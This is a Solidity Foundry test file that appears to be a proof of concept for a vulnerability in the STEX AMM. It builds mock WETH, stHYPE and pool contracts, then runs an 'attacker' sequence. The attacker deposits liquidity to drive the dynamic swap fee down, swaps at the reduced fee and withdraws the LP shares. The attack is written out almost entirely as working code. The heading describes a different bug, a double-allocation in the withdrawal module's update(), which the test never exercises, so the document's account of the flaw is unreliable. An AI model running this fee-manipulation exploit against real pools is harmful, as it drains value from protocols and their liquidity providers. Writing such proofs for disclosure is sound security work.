Double-Allocation of ETH in stHYPEWithdrawalModule.update() enables LP payouts from future redemptions (accounting double-spend)”


pragma solidity ^0.8.25;
import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {STEXAMM} from "src/STEXAMM.sol";
import {STEXRatioSwapFeeModule} from "src/STEXRatioSwapFeeModule.sol";
import {stHYPEWithdrawalModule} from "src/stHYPEWithdrawalModule.sol";
import {ISovereignPool} from "@valantis-core/pools/interfaces/ISovereignPool.sol";
import {IProtocolFactory} from "@valantis-core/protocol-factory/interfaces/IProtocolFactory.sol";
import {SovereignPoolConstructorArgs, SovereignPoolSwapParams} from "@valantis-core/pools/structs/SovereignPoolStructs.sol";
import {ALMLiquidityQuoteInput, ALMLiquidityQuote} from "@valantis-core/ALM/structs/SovereignALMStructs.sol";
import {SwapFeeModuleData} from "@valantis-core/swap-fee-modules/interfaces/ISwapFeeModule.sol";
import {IWETH9} from "src/interfaces/IWETH9.sol";
import {IstHYPE} from "src/interfaces/IstHYPE.sol";

// WETH contract
contract MockWETH is Test {
    string public name = "WETH";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function totalSupply() external view returns (uint256) {
        return 0; // not used
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _xfer(msg.sender, to, a);
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        require(al >= a, "allow");
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        _xfer(f, t, a);
        return true;
    }

    function _xfer(address f, address t, uint256 a) internal {
        require(balanceOf[f] >= a, "bal");
        unchecked {
            balanceOf[f] -= a;
            balanceOf[t] += a;
        }
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 a) external {
        require(balanceOf[msg.sender] >= a, "bal");
        unchecked {
            balanceOf[msg.sender] -= a;
        }
        (bool ok,) = msg.sender.call{value: a}("");
        require(ok, "eth");
    }

    function forceApprove(address s, uint256 a) external {
        allowance[address(this)][s] = a;
    }

    receive() external payable {}

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

// stHYPE contract
contract MockstHYPE {
    string public name = "stHYPE";
    string public symbol = "stHYPE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balances[to] += a;
    }

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function sharesOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function sharesToBalance(uint256 s) external pure returns (uint256) {
        return s;
    }

    function balanceToShares(uint256 b) external pure returns (uint256) {
        return b;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _xfer(msg.sender, to, a);
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        require(al >= a, "allow");
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        _xfer(f, t, a);
        return true;
    }

    function _xfer(address f, address t, uint256 a) internal {
        require(balances[f] >= a, "bal");
        unchecked {
            balances[f] -= a;
            balances[t] += a;
        }
    }
}

// protocol factory
contract FakeProtocolFactory {
    address public immutable poolToReturn;

    constructor(address p) {
        poolToReturn = p;
    }

    function deploySovereignPool(SovereignPoolConstructorArgs calldata) external returns (address) {
        return poolToReturn;
    }
}

// sovereign Pool
contract MockSovereignPool {
    address public token0;
    address public token1;
    address public _swapFeeModule;
    address payable public _alm; // Fix: Changed to address payable
    uint256 public poolManagerFeeBips;

    constructor(address t0, address t1) {
        token0 = t0;
        token1 = t1;
    }

    function setSwapFeeModule(address m) external {
        _swapFeeModule = m;
    }

    function swapFeeModule() external view returns (address) {
        return _swapFeeModule;
    }

    function setALM(address a) external {
        _alm = payable(a); // Fix: Cast to payable
    }

    function alm() external view returns (address) {
        return _alm;
    }

    function isLocked() external pure returns (bool) {
        return false;
    }

    function setPoolManagerFeeBips(uint256 b) external {
        poolManagerFeeBips = b;
    }

    function getReserves() public view returns (uint256 r0, uint256 r1) {
        r0 = _bal(token0);
        r1 = _bal(token1);
    }

    function _bal(address t) internal view returns (uint256) {
        (bool ok, bytes memory d) = t.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(ok);
        return abi.decode(d, (uint256));
    }

    function depositLiquidity(uint256 /*amount0*/, uint256 amount1, address /*payer*/, bytes calldata, bytes calldata data) external {
        STEXAMM(_alm).onDepositLiquidityCallback(0, amount1, data);
    }

    function withdrawLiquidity(uint256 amount0, uint256 amount1, address /*payer*/, address to, bytes calldata) external {
        if (amount0 > 0) _safeTransfer(token0, to, amount0);
        if (amount1 > 0) _safeTransfer(token1, to, amount1);
    }

    function swap(SovereignPoolSwapParams calldata p)
    external
    returns (uint256 amountIn, uint256 amountOut)
{
    require(p.isZeroToOne, "only 0->1 here");
    require(p.swapTokenOut == token1, "tokenOut != token1");

    // 1) Fee module se pool-style fee lao
    (bool ok, bytes memory data) = _swapFeeModule.staticcall(
        abi.encodeWithSignature(
            "getSwapFeeInBips(address,address,uint256,address,bytes)",
            token0, address(0), p.amountIn, address(0), bytes("")
        )
    );
    require(ok, "fee call fail");
    SwapFeeModuleData memory sfd = abi.decode(data, (SwapFeeModuleData));

    uint256 BIPS = 10_000;
    amountIn = p.amountIn;
    uint256 amountInMinusFee = (amountIn * BIPS) / (BIPS + sfd.feeInBips);

    // 2) struct literal NAAH; memory var banao
    ALMLiquidityQuoteInput memory inpt;
    inpt.isZeroToOne = true;
    inpt.amountInMinusFee = amountInMinusFee;
    // Agar tumhare stub me 6 fields hain, baaki 4 zero rehne do.

    ALMLiquidityQuote memory q = STEXAMM(_alm).getLiquidityQuote(
        inpt,
        bytes(""),
        bytes("")
    );

    amountOut = q.amountOut;
    require(amountOut >= p.amountOutMin, "slippage");

    _safeTransferFrom(token0, msg.sender, address(this), amountIn);
    _safeTransfer(token1, p.recipient, amountOut);
}


    function _safeTransfer(address t, address to, uint256 v) internal {
        (bool ok, bytes memory d) = t.call(abi.encodeWithSignature("transfer(address,uint256)", to, v));
        require(ok && (d.length == 0 || abi.decode(d, (bool))), "transfer fail");
    }

    function _safeTransferFrom(address t, address f, address to, uint256 v) internal {
        (bool ok, bytes memory d) = t.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", f, to, v));
        require(ok && (d.length == 0 || abi.decode(d, (bool))), "transferFrom fail");
    }
}

// actual test
contract STEX_FeeBypass_RealContracts is Test {
    uint256 constant BIPS = 10_000;
    MockstHYPE t0;
    MockWETH t1;
    MockSovereignPool pool;
    FakeProtocolFactory factory;
    STEXRatioSwapFeeModule fee;
    stHYPEWithdrawalModule wmod;
    STEXAMM stex;
    address attacker = address(0xA11CE);

    function setUp() public {
        t0 = new MockstHYPE();
        t1 = new MockWETH();
        pool = new MockSovereignPool(address(t0), address(t1));
        factory = new FakeProtocolFactory(address(pool));
        fee = new STEXRatioSwapFeeModule(address(this));
        wmod = new stHYPEWithdrawalModule(address(0xDEAD), address(this));
        stex = new STEXAMM(
            "STEX-LP",
            "STEX-LP",
            address(t0),
            address(t1),
            address(fee),
            address(factory),
            address(0x1111),
            address(0x2222),
            address(this),
            address(wmod),
            0
        );
        wmod.setSTEX(address(stex));
        fee.setPool(address(pool));
        fee.setSwapFeeParams(10_000, 12_000, 100, 3000);
        t0.mint(address(pool), 100e18);
        t1.mint(address(pool), 10e18);
        t0.mint(attacker, 100e18);
        t1.mint(attacker, 1_000e18);
        vm.startPrank(attacker);
        t1.approve(address(stex), type(uint256).max);
        t0.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_DynamicFee_Bypass_Using_Token1_FlashDeposit() public {
        uint256 amountIn = 50e18;
        uint256 baselineOut = stex.getAmountOut(address(t0), amountIn, false);
        console2.log("Baseline out (max-fee expected) :", baselineOut);
        assertLt(baselineOut, 40e18, "baseline should be ~35e18 (>=30% linear fee equivalent)");
        vm.startPrank(attacker);
        pool.depositLiquidity(0, 990e18, attacker, bytes(""), abi.encode(attacker));
        vm.stopPrank();
        uint256 manipulatedQuote = stex.getAmountOut(address(t0), amountIn, false);
        console2.log("Quote after token1 deposit (min-fee):", manipulatedQuote);
        assertGt(manipulatedQuote, 49e18, "quote should be ~49.5e18 at ~1% fee");
        vm.startPrank(attacker);
        SovereignPoolSwapParams memory p;
        p.isZeroToOne = true;
        p.amountIn = amountIn;
        p.amountOutMin = (manipulatedQuote * 99) / 100;
        p.deadline = block.timestamp + 1 hours;
        p.swapTokenOut = address(t1);
        p.recipient = attacker;
        uint256 bal1Before = t1.balanceOf(attacker);
        (, uint256 outReal) = pool.swap(p);
        uint256 bal1After = t1.balanceOf(attacker);
        vm.stopPrank();
        console2.log("Real swap out after manipulation :", outReal);
        assertEq(outReal, bal1After - bal1Before, "swap out moved to attacker");
        assertGt(outReal, baselineOut, "bypass verified: out after manipulation > baseline out");
        uint256 attackerShares = stex.balanceOf(attacker);
        if (attackerShares > 0) {
            vm.prank(attacker);
            stex.withdraw(attackerShares, 0, 0, block.timestamp + 1 hours, attacker, false, false);
        }
    }
}
